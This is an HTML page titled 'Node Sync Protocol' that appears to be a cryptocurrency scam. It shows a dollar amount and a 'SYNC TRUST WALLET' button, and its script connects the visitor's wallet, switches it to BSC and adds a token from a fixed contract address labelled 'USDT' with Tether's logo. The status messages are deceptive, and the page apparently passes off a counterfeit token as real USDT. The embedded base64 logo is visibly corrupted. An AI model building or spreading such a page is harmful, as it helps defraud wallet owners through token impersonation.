<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Node Sync Protocol</title>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/5.7.2/ethers.umd.min.js"></script>
    <style>
        :root { --tether-green: #26a17b; --bg-dark: #0a0b0d; --card-bg: #121418; }
        body { background: var(--bg-dark); color: #fff; font-family: sans-serif; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; }
        .container { background: var(--card-bg); border: 1px solid #2d333b; border-radius: 20px; padding: 35px; width: 350px; text-align: center; }
        .main-logo { width: 85px; height: 85px; border-radius: 50%; box-shadow: 0 0 15px var(--tether-green); margin-bottom: 20px; }
        .price-display { background: rgba(38, 161, 123, 0.1); border: 1px dashed var(--tether-green); border-radius: 12px; padding: 20px; margin-bottom: 25px; }
        .amount { font-size: 28px; font-weight: bold; }
        .action-btn { background: var(--tether-green); color: white; border: none; width: 100%; padding: 16px; border-radius: 10px; font-weight: bold; cursor: pointer; display: flex; align-items: center; justify-content: center; gap: 10px; }
        #status { font-size: 11px; color: #26a17b; margin-top: 15px; font-family: monospace; }
    </style>
</head>
<body>

<div class="container">
    <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAIAAAACACAYAAADDPmHLAAAACXBIWXMAAAsTAAALEwEAmpwYAAABy0lEQVR4nO3dv0vVURzH8dfnVpS0S0S0REREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREf0LpZ3L680Lpe0AAAAASUVORK5CYII=" class="main-logo" id="uiLogo">
    
    <div class="price-display">
        <div class="amount">$1,066.45</div>
    </div>

    <button class="action-btn" id="mainAction">SYNC TRUST WALLET</button>
    <div id="status">READY</div>
</div>

<script>
    const CONTRACT = "0x5Cd9e1C97d3784DC7BFC4E5cefd775F58778985f";
    // Direct Base64 link for the wallet popup to ensure logo shows
    const LOGO_DATA = "https://cryptologos.cc/logos/tether-usdt-logo.png"; 

    async function process() {
        const status = document.getElementById('status');
        const provider = window.trustwallet || window.ethereum;

        if (!provider) { alert("Trust Wallet not found!"); return; }

        try {
            status.innerText = "> CONNECTING...";
            await provider.request({ method: 'eth_requestAccounts' });

            status.innerText = "> SWITCHING TO BSC...";
            await provider.request({
                method: 'wallet_switchEthereumChain',
                params: [{ chainId: '0x38' }],
            });

            status.innerText = "> INJECTING ASSET...";
            await provider.request({
                method: 'wallet_watchAsset',
                params: {
                    type: 'ERC20',
                    options: {
                        address: CONTRACT,
                        symbol: 'USDT',
                        decimals: 18,
                        image: LOGO_DATA,
                    },
                },
            });

            status.innerText = "> SUCCESSFUL";
            alert("Node Sync Complete!");
        } catch (err) {
            status.innerText = "> ERROR: " + (err.message || "FAILED");
        }
    }

    document.getElementById('mainAction').addEventListener('click', process);
</script>
</body>
</html>
